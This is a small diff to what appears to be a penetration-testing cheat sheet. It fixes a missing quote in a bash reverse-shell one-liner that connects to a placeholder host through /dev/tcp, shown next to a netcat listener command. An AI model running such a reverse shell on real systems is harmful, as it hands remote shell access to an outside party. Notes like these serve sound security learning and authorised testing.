@@ -38,7 +38,7 @@ CRTL + U
 ```bash
 # in seperate terminals
 nc -nvlp 9999
-bash -c "bash -i >& /dev/tcp/<host ip>/<host port> 0>&1
+bash -c "bash -i >& /dev/tcp/<host ip>/<host port> 0>&1"
 ```
 ### Stabilise a reverse shell
 ```bash
